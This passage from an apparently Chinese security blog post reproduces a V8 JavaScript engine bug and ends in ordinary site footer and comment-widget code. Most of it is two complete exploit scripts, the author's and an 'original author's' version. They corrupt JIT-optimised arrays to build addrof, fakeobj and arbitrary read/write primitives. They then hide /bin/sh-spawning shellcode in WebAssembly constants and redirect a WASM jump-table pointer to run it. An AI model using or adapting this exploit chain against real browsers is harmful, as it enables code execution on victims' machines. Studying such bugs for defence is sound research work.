class="number">10</span>, <span class="number">133</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">    <span class="number">130</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">106</span>, <span class="number">59</span>, <span class="number">88</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>,</span><br><span class="line">    <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">104</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">104</span>, <span class="number">47</span>, <span class="number">98</span>,</span><br><span class="line">    <span class="number">105</span>, <span class="number">110</span>, <span class="number">89</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">193</span>, <span class="number">227</span>, <span class="number">32</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">68</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">203</span>, <span class="number">83</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>,</span><br><span class="line">    <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">210</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>,</span><br><span class="line">    <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>,</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">let</span> shell_wasm_module = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(shell_wasm_code);</span><br><span class="line"><span class="keyword">let</span> shell_wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(shell_wasm_module);</span><br><span class="line"><span class="keyword">let</span> shell_func = shell_wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shell_wasm_instance_addr = <span class="title function_">addrof</span>(shell_wasm_instance);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Shell WASM instance addr: 0x&quot;</span> + shell_wasm_instance_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> shell_wasm_trusted_data_addr = <span class="title function_">arb_read</span>(shell_wasm_instance_addr + <span class="number">0x8n</span>)&gt;&gt;<span class="number">32n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Shell WASM trusted data addr: 0x&quot;</span> + shell_wasm_trusted_data_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> jump_table_start_addr = <span class="title function_">arb_read</span>(shell_wasm_trusted_data_addr + <span class="number">0x28n</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Jump Table Start addr: 0x&quot;</span> + jump_table_start_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> shell_code_addr = jump_table_start_addr + <span class="number">0x89cn</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Shell code addr: 0x&quot;</span> + shell_code_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="title function_">arb_write</span>(shell_wasm_trusted_data_addr + <span class="number">0x28n</span>, shell_code_addr);</span><br><span class="line"><span class="title function_">shell_func</span>();</span><br></pre></td></tr></table></figure>

<p>原作者的EXP也放置在这里，可以用作对比:</p>
<blockquote>
<p>其实主要区别就是原作者的覆盖放在了新的函数，但这里其实没必要大费周章的新建函数，只要保证是初次调用函数即可</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> x + x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> f64_buf = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> u64_buf = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">convertToHex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ftoi</span>(<span class="params">val</span>) &#123;</span><br><span class="line">  f64_buf[<span class="number">0</span>] = val;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">BigInt</span>(u64_buf[<span class="number">0</span>]) + (<span class="title class_">BigInt</span>(u64_buf[<span class="number">1</span>]) &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">itof</span>(<span class="params">val</span>) &#123;</span><br><span class="line">  u64_buf[<span class="number">0</span>] = <span class="title class_">Number</span>(val &amp; <span class="number">0xffffffffn</span>);</span><br><span class="line">  u64_buf[<span class="number">1</span>] = <span class="title class_">Number</span>(val &gt;&gt; <span class="number">32n</span>);</span><br><span class="line">  <span class="keyword">return</span> f64_buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ftoi32</span>(<span class="params">val</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line">  <span class="keyword">var</span> f64_buf = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line">  <span class="keyword">var</span> u64_buf = <span class="keyword">new</span> <span class="title class_">Uint32Array</span>(buf);</span><br><span class="line">  f64_buf[<span class="number">0</span>] = val;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">BigInt</span>(u64_buf[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; ++i) &#123;</span><br><span class="line">        res = <span class="title function_">foo</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> corrupting_array = [<span class="number">0.1</span>, <span class="number">0.1</span>];</span><br><span class="line">    <span class="keyword">let</span> corrupted_array = [<span class="number">0.1</span>,<span class="number">0.1</span>,<span class="number">0.1</span>];</span><br><span class="line">    <span class="keyword">let</span> buf_array = [&#123;&#125;];</span><br><span class="line">    overwrite = <span class="title function_">ftoi</span>(corrupting_array[(res-<span class="number">4</span>)*<span class="number">7</span>]) + <span class="number">0x100000000000n</span>;</span><br><span class="line">    corrupting_array[(res-<span class="number">4</span>)*<span class="number">7</span>] = <span class="title function_">itof</span>(overwrite);</span><br><span class="line">    overwrite = <span class="title function_">ftoi</span>(corrupting_array[(res-<span class="number">4</span>)*<span class="number">2</span>]) + <span class="number">0x100000000000n</span>;</span><br><span class="line">    corrupting_array[(res-<span class="number">4</span>)*<span class="number">2</span>] = <span class="title function_">itof</span>(overwrite);</span><br><span class="line">    <span class="keyword">return</span> [corrupted_array, buf_array];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> o;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; <span class="number">1000</span>; index++) &#123;</span><br><span class="line">    </span><br><span class="line">    o = <span class="title function_">test</span>();</span><br><span class="line">    <span class="keyword">if</span> (o[<span class="number">0</span>].<span class="property">length</span> != <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> leakArr = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    o[<span class="number">1</span>][<span class="number">0</span>] = obj;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">ftoi</span>(o[<span class="number">0</span>][<span class="number">9</span>])&gt;&gt;<span class="number">32n</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeobj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    o[<span class="number">0</span>][<span class="number">9</span>] = <span class="title function_">itof</span>((addr&lt;&lt;<span class="number">32n</span>) + <span class="number">2n</span>);</span><br><span class="line">    <span class="keyword">return</span> o[<span class="number">1</span>][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arb_read</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">2n</span> == <span class="number">1n</span>) &#123;</span><br><span class="line">      addr -= <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    addr -= <span class="number">7n</span>;</span><br><span class="line">    o[<span class="number">0</span>][<span class="number">58</span>] =  <span class="title function_">itof</span>((<span class="title function_">ftoi</span>(o[<span class="number">0</span>][<span class="number">58</span>])&amp;<span class="number">0xffffffff00000000n</span>) + addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">ftoi</span>(leakArr[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arb_write</span>(<span class="params">addr, data</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (addr % <span class="number">2n</span> == <span class="number">1n</span>) &#123;</span><br><span class="line">      addr -= <span class="number">1n</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    addr -= <span class="number">7n</span>;</span><br><span class="line">    o[<span class="number">0</span>][<span class="number">58</span>] =  <span class="title function_">itof</span>((<span class="title function_">ftoi</span>(o[<span class="number">0</span>][<span class="number">58</span>])&amp;<span class="number">0xffffffff00000000n</span>) + addr);</span><br><span class="line"></span><br><span class="line">    leakArr[<span class="number">0</span>] = <span class="title function_">itof</span>(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copyshellcode</span>(<span class="params">addr, shellcode</span>) &#123;</span><br><span class="line">    addr = <span class="title class_">BigInt</span>(addr);</span><br><span class="line">    buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line">    dataview = <span class="keyword">new</span> <span class="title class_">DataView</span>(buf);</span><br><span class="line">    buf_addr = <span class="title function_">addrof</span>(buf);</span><br><span class="line">    backing_store_addr = <span class="title class_">BigInt</span>(buf_addr) + <span class="number">0x14n</span>;</span><br><span class="line">    <span class="title function_">arb_write</span>(backing_store_addr, <span class="title class_">BigInt</span>(addr));</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">      dataview.<span class="title function_">setUint32</span>(<span class="number">4</span> * i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// redirect the function start to our shellcode</span></span><br><span class="line"><span class="keyword">let</span> shell_wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([</span><br><span class="line">    <span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>, <span class="number">7</span>, <span class="number">17</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">133</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">    <span class="number">130</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">106</span>, <span class="number">59</span>, <span class="number">88</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>,</span><br><span class="line">    <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">104</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">104</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">104</span>, <span class="number">47</span>, <span class="number">98</span>,</span><br><span class="line">    <span class="number">105</span>, <span class="number">110</span>, <span class="number">89</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">193</span>, <span class="number">227</span>, <span class="number">32</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">68</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">203</span>, <span class="number">83</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>,</span><br><span class="line">    <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">210</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">144</span>, <span class="number">144</span>, <span class="number">144</span>,</span><br><span class="line">    <span class="number">144</span>, <span class="number">235</span>, <span class="number">11</span>, <span class="number">57</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>,</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">let</span> shell_wasm_module = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(shell_wasm_code);</span><br><span class="line"><span class="keyword">let</span> shell_wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(shell_wasm_module);</span><br><span class="line"><span class="keyword">let</span> shell_func = shell_wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="title function_">shell_func</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shell_wasm_instance_addr = <span class="title function_">addrof</span>(shell_wasm_instance);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Shell WASM instance addr: &quot;</span> + shell_wasm_instance_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> shell_wasm_trusted_data_addr = <span class="title function_">arb_read</span>(shell_wasm_instance_addr + <span class="number">0x8n</span>)&gt;&gt;<span class="number">32n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Shell WASM trusted data addr: &quot;</span> + shell_wasm_trusted_data_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> shell_wasm_rwx_addr = <span class="title function_">arb_read</span>(shell_wasm_trusted_data_addr + <span class="number">0x28n</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Shell RWX addr: &quot;</span> + shell_wasm_rwx_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> shell_func_code_addr = shell_wasm_rwx_addr + <span class="number">0x840n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Shell func code addr: &quot;</span> + shell_func_code_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> shell_code_addr = shell_func_code_addr + <span class="number">0x6fn</span> - <span class="number">0x13n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Shell code addr: &quot;</span> + shell_code_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> fake_wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([</span><br><span class="line"><span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line"><span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line"><span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>,</span><br><span class="line"><span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>,</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">let</span> fake_wasm_module = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(fake_wasm_code);</span><br><span class="line"><span class="keyword">let</span> fake_wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(fake_wasm_module);</span><br><span class="line"><span class="keyword">let</span> fake_func = fake_wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> fake_wasm_instance_addr = <span class="title function_">addrof</span>(fake_wasm_instance);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Fake WASM instance addr: &quot;</span> + fake_wasm_instance_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> fake_wasm_trusted_data_addr = <span class="title function_">arb_read</span>(fake_wasm_instance_addr + <span class="number">0x8n</span>)&gt;&gt;<span class="number">32n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Fake WASM trusted data addr: &quot;</span> + fake_wasm_trusted_data_addr.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="title function_">arb_write</span>(fake_wasm_trusted_data_addr + <span class="number">0x28n</span>, shell_code_addr);</span><br><span class="line"></span><br><span class="line"><span class="title function_">fake_func</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>


</div> 

<script>
    window.onload = detectors();
</script>
    <div class="post-footer">
    <div class="h-line-primary"></div>
    <nav class="post-nav">
        <div class="prev-item">
           
        </div>
        <div class="next-item">
            
                <div class="icon arrow-right"></div>
                <div class="post-link">
                  <a href="/2025/04/15/%E3%80%90V8%E3%80%91Sanbox%20Escape%E5%A4%8D%E7%8E%B0issue%20361862752/">Next</a>  
                </div>  
            
        </div>
    </nav>
</div>

    
      <div class="post-comment">

    
        <div id="vcomments"></div>
        <script>
            var META = ['nick', 'mail', 'link'];
            var meta = 'nick,mail';
            meta = meta.split(',').filter(item => {
                return META.includes(item);
            });
            new Valine({
                el: '#vcomments',
                appId: 'DUED8cgPikeUCRaIp4gFIBme-MdYXbMMI',
                appKey: '3QIsnGOImCccibpw0MDrZVCk',
                serverURLs: 'https://dued8cgp.api.lncldglobal.com',
                lang: 'zh-CN',
                placeholder: '**邮箱仅用于及时接收评论回复通知且非公开**\n无其他用途，请放心填写。',
                avatar: 'mp',
                meta: meta
            })
        </script>    
     

     
    
    

</div>
     
  
</article>
        </div>
      </div>
      
      <div class="footer">
    <div class="flex-container">
        <div class="footer-text">
            
            
            
                Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a target="_blank" rel="noopener" href="https://github.com/zoeingwingkei/frame/">Frame</a>
                
        </div>
    </div>
</div>

    </div>

    
      <div class="search-popup">
    <div class="search-popup-overlay">  
    </div>
    <div class="search-popup-window" >
        <div class="search-header">
            <div class="search-input-container">
              <input autocomplete="off" autocapitalize="off" maxlength="80"
                     placeholder="Search Anything" spellcheck="false"
                     type="search" class="search-input">
            </div>
            <div class="search-close-btn">
                <div class="icon close-btn"></div>
            </div>
        </div>
        <div class="search-result-container">
        </div>
    </div>
</div>

<script>
    const searchConfig = {
        path             : "/search.xml",
        top_n_per_article: "1",
        unescape         : "false",
        trigger: "auto",
        preload: "false"
    }
</script>
<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script>
<script src="/js/search.js"></script>
    
    

  <!-- hexo injector body_end start -->
  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
  <script data-pjax>
        function GithubCalendarConfig(){
            var git_githubapiurl ="https://python-github-calendar-api.vercel.app/api?Loora1N";
            var git_color =['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'];
            var git_user ="Loora1N";
            var parent_div_git = document.getElementById('recent-posts');
